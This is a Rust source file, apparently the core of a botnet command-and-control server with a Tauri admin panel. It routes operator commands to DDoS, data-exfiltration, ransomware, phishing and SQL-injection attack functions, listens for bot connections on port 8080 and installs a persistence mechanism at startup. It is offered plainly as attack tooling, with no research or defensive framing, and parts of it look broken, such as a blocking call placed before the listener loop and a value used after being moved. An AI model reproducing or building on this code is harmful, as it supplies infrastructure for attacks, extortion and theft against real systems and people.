
mod attacks;
mod commands;
mod config;
mod error;
mod persistence;

use commands::{Command, CommandResult};
use config::Config;
use error::{C2Error, handle_error};
use attacks::{ddos_attack, data_exfiltration, ransomware_attack, phishing_attack, sql_injection_attack};
use tokio::net::TcpListener;
use tauri::Manager;

async fn handle_command(command: Command) -> Result<String, C2Error> {
    match command.command.as_str() {
        "ddos" => {
            if let Some(target_ip) = command.args.get(0) {
                if let Some(target_port) = command.args.get(1) {
                    let port: u16 = target_port.parse().map_err(|e| C2Error::CommandError(e.to_string()))?;
                    ddos_attack(target_ip, port).await.map_err(C2Error::from)?;
                    Ok("DDoS attack initiated".to_string())
                } else {
                    Err(C2Error::CommandError("Missing target port".to_string()))
                }
            } else {
                Err(C2Error::CommandError("Missing target IP".to_string()))
            }
        }
        "exfiltrate" => {
            if let Some(target_ip) = command.args.get(0) {
                if let Some(target_port) = command.args.get(1) {
                    let port: u16 = target_port.parse().map_err(|e| C2Error::CommandError(e.to_string()))?;
                    let data = command.args.get(2).unwrap_or(&"".to_string()).as_bytes();
                    data_exfiltration(target_ip, port, data).await.map_err(C2Error::from)?;
                    Ok("Data exfiltration initiated".to_string())
                } else {
                    Err(C2Error::CommandError("Missing target port".to_string()))
                }
            } else {
                Err(C2Error::CommandError("Missing target IP".to_string()))
            }
        }
        "ransomware" => {
            if let Some(target_ip) = command.args.get(0) {
                if let Some(target_port) = command.args.get(1) {
                    let port: u16 = target_port.parse().map_err(|e| C2Error::CommandError(e.to_string()))?;
                    let encryption_key = command.args.get(2).unwrap_or(&"".to_string()).as_bytes();
                    ransomware_attack(target_ip, port, encryption_key).await.map_err(C2Error::from)?;
                    Ok("Ransomware attack initiated".to_string())
                } else {
                    Err(C2Error::CommandError("Missing target port".to_string()))
                }
            } else {
                Err(C2Error::CommandError("Missing target IP".to_string()))
            }
        }
        "phishing" => {
            if let Some(target_email) = command.args.get(0) {
                if let Some(email_content) = command.args.get(1) {
                    phishing_attack(target_email, email_content).await.map_err(C2Error::from)?;
                    Ok("Phishing attack initiated".to_string())
                } else {
                    Err(C2Error::CommandError("Missing email content".to_string()))
                }
            } else {
                Err(C2Error::CommandError("Missing target email".to_string()))
            }
        }
        "sql_injection" => {
            if let Some(target_url) = command.args.get(0) {
                if let Some(malicious_query) = command.args.get(1) {
                    sql_injection_attack(target_url, malicious_query).await.map_err(C2Error::from)?;
                    Ok("SQL injection attack initiated".to_string())
                } else {
                    Err(C2Error::CommandError("Missing malicious query".to_string()))
                }
            } else {
                Err(C2Error::CommandError("Missing target URL".to_string()))
            }
        }
        _ => Err(C2Error::CommandError("Unknown command".to_string())),
    }
}

#[tokio::main]
async fn main() -> Result<(), C2Error> {
    // Load configuration
    let config = Config::load();

    // Setup TCP listener for incoming bot connections
    let listener = TcpListener::bind("0.0.0.0:8080").await.map_err(|e| C2Error::NetworkError(e.to_string()))?;

    // Load persistence mechanism
    persistence::add_persistence();

    // Start the Tauri app for the admin panel
    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![execute_command])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");

    // Listen for incoming connections
    loop {
        let (mut socket, _) = listener.accept().await.map_err(|e| C2Error::NetworkError(e.to_string()))?;
        let mut buffer = [0; 1024];
        let n = socket.read(&mut buffer).await.map_err(|e| C2Error::NetworkError(e.to_string()))?;
        let command: Command = serde_json::from_slice(&buffer[..n]).map_err(|e| C2Error::CommandError(e.to_string()))?;
        
        let result = handle_command(command).await.unwrap_or_else(|e| format!("Error: {}", e));
        let response = CommandResult { id: command.id, result };

        socket.write_all(&serde_json::to_vec(&response).map_err(|e| C2Error::CommandError(e.to_string()))?).await.map_err(|e| C2Error::NetworkError(e.to_string()))?;
    }
}

#[tauri::command]
async fn execute_command(command: String, args: Vec<String>) -> Result<CommandResult, String> {
    let cmd = Command { id: 0, command, args };
    let result = handle_command(cmd).await.map_err(|e| e.to_string())?;
    Ok(CommandResult { id: 0, result })
}
